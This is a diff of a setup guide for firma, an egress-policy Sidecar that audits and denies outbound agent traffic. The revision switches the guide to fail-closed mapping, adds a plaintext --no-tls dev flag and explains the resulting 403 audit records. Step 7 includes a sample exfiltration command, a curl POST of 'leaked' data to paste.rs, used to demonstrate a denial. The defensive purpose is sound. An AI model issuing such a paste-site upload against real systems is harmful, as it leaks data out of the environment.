@@ -9,9 +9,9 @@ By the end you will have:
 
 - A working `firma.toml` you understand line by line.
 - A running Sidecar that audits every outbound call to the configured destinations.
-- A simple agent (just `curl`) routed through it, producing ALLOW and DENY decisions.
+- A simple agent (just `curl`) routed through it, demonstrating fail-closed denials without a capability.
 
-This guide does **not** cover [`firma run`](../firma-run/) (the sandbox wrapper), HTTPS MITM, or capability-mediated workloads. Those build on this baseline.
+This guide does **not** provision capabilities or cover [`firma run`](../firma-run/) (the sandbox wrapper) or HTTPS MITM. To reach the Cedar ALLOW/DENY decisions, first provision a session capability using [Issue capability tokens](../issue-capability-tokens/).
 
 ## Prerequisites
 
@@ -51,9 +51,7 @@ Keep this file private. It's your tamper-evidence root.
 Create `/tmp/firma-standalone/config/mapping-rules.toml`:
 
 ```toml
-# Map the calls we want to enforce on. Anything not listed here will
-# be PASSTHROUGH because we set default_protected = false in the
-# sidecar config below — convenient for first-touch experimentation.
+# Map legitimate calls. Unmatched destinations are denied.
 
 [[rules]]
 method       = "GET"
@@ -68,7 +66,7 @@ path         = "*"
 action_class = "communication.external.send"
 ```
 
-These two rules are enough to demonstrate ALLOW (a weather query) and DENY (a paste exfiltration attempt) without any third-party API keys.
+These rules classify weather queries and paste requests. Both remain denied until a valid capability authorizes the request's session, action, and resource.
 
 ## Step 4: Write a minimal Cedar policy
 
@@ -122,6 +120,7 @@ shared, sectioned `firma.toml`:
 
 ```toml
 [authority]
+mapping_rules_paths = ["/tmp/firma-standalone/config/mapping-rules.toml"]
 listen_addr         = "[::1]:50051"
 policy_dir          = "/tmp/firma-standalone/config/policies"
 issuance_policy_dir = "/tmp/firma-standalone/config/issuance"
@@ -134,10 +133,6 @@ bundle_ttl = "30s"
 mode               = "http_proxy"
 listen_addr        = "127.0.0.1:8080"
 drain_timeout = "5s"
-
-[sidecar.mapping]
-rules_path        = "/tmp/firma-standalone/config/mapping-rules.toml"
-default_protected = false
 
 [sidecar.policy]
 dir = "/tmp/firma-standalone/config/policies"
@@ -154,14 +149,13 @@ signing_key_path = "/tmp/firma-standalone/audit.key"
 
 Notes:
 
-- **`[sidecar.authority].url` is required** for Stage 2 on mapped routes.
-  Without it the Sidecar keeps a deny-all stale evaluator and every protected
-  call becomes `policy bundle stale`.
+- **`[sidecar.authority].url` is required.** The Sidecar refuses to start
+  without it and reports ready only after the Authority publishes its policy
+  and mapping snapshot.
 - The standalone Sidecar does not request capabilities. Use `firma run` for
   automatic per-session issuance before sending protected requests; see
   [Issue capability tokens](../issue-capability-tokens/).
-- **`default_protected = false`** keeps unmapped destinations as passthrough
-  while you experiment. Production stacks should use `true`.
+- Mappings are loaded by the Authority; unmatched destinations are always denied.
 - No `[sidecar.ca]` section — these demo curls use plain HTTP. See
   [Enable HTTPS MITM](../https-mitm/) when you need L7 visibility on TLS.
 - Duration values keep their compact unit-bearing syntax, such as `"5s"`.
@@ -177,8 +171,12 @@ Two terminals.
 **Terminal 1 — Authority:**
 
 ```bash
-firma authority -c /tmp/firma-standalone/config/firma.toml
+firma authority --no-tls -c /tmp/firma-standalone/config/firma.toml
 ```
+
+`--no-tls` explicitly selects plaintext for this loopback-only development stack,
+matching the Sidecar's `http://` Authority URL. Without it, Authority startup
+requires TLS material.
 
 **Terminal 2 — Sidecar:**
 
@@ -186,48 +184,41 @@ firma authority -c /tmp/firma-standalone/config/firma.toml
 firma sidecar -c /tmp/firma-standalone/config/firma.toml
 ```
 
-Expected Sidecar output (lightly trimmed):
-
-```text
-INFO config loaded path="/tmp/firma-standalone/config/firma.toml"
-INFO mapping table loaded rules=2
-INFO policy bundle loaded version="…" policies=1
-INFO authority stream connected endpoint="http://[::1]:50051"
-INFO connector registry built hosts=0 default_timeout_ms=…
-INFO interceptor listening addr="127.0.0.1:8080"
-INFO ready
-```
-
-The `ready` line is held until the Authority policy and revocation streams
-hydrate — so the first proxied request cannot race ahead of enforcement.
+Wait for `sidecar ready`. This line is held until the Authority policy and
+revocation streams hydrate — so the first proxied request cannot race ahead of
+enforcement.
 
 ## Step 7: Send traffic through it
 
-In a second terminal, route a couple of curl calls through the proxy:
+In another terminal, route a couple of curl calls through the proxy:
 
 ```bash
-# Should ALLOW
+# DENY (HTTP 403): no session capability is provisioned in this guide.
 curl --proxy http://127.0.0.1:8080 http://wttr.in/london?format=3
 
-# Should DENY (HTTP 403 from the Sidecar)
+# DENY (HTTP 403) for the same missing-capability reason.
 curl --proxy http://127.0.0.1:8080 -X POST http://paste.rs/ -d 'leaked'
 ```
 
-The first call returns weather text. The second call returns a 403 — the Sidecar refused to dispatch it because the policy forbids `paste.rs/`.
+Both calls return 403 at Stage 1, before Cedar evaluation or upstream dispatch.
+These denials do not prove the Cedar forbid policy ran. Once a matching
+capability is provisioned and its session is attached to each request, the
+weather call can reach the permit policy and the paste call reaches the forbid
+policy.
 
 ## Step 8: Read the audit log
 
 ```bash
-tail -n 5 /tmp/firma-standalone/logs/audit.jsonl | python3 -m json.tool
+tail -n 2 /tmp/firma-standalone/logs/audit.jsonl
 ```
 
 You'll see two records (one per curl), each with:
 
-- `decision`: `1` for ALLOW or `2` for DENY.
-- `action`: `"communication.external.send"` for both.
-- `resource`: the normalized host+path, such as `"wttr.in/london"` or `"paste.rs/"`.
-- `deny_reason`: empty for ALLOW; for the forbidden paste, a string like
-  `"policy denied: policy denied action 'communication.external.send' on resource 'paste.rs/'"`.
+- `decision`: `2` for DENY.
+- `action`: `"raw.http.GET"` or `"raw.http.POST"` for these early capability denials.
+- `resource`: `"wttr.in/london?format=3"` or `"paste.rs/"` for these requests.
+- `deny_reason`: `"token invalid: no capability token covers action ..."`, naming
+  the mapped action class and resource.
 - `signature`: a base64-encoded DER signature that you can verify with the public side of `audit.key`.
 
 For verifying the signature, see [Read & verify the audit log](../audit-log/).
@@ -244,7 +235,9 @@ emits `sidecar ready` only after the required streams hydrate. For
 deployment probe guidance, see
 [startup ordering and readiness](../deploy-a-genai-webapp/#step-6-configure-startup-ordering-and-readiness).
 
-**`UnclassifiedIntent` for unfamiliar destinations.** With `default_protected = true`, anything you didn't map denies. That's the right shape in production; for development, leave `default_protected = false` until you've enumerated the rules you actually want.
+**`UnclassifiedIntent` for unfamiliar destinations.** Add an explicit Authority
+mapping for each legitimate destination. There is no Sidecar passthrough setting
+for unmatched traffic; see [Extend the mapping](../extend-mapping/).
 
 **Permission denied on `audit.key`.** The Sidecar reads it at startup; `chmod 600` is fine. If the key is unreadable, startup fails fast and prints the path it tried.
 
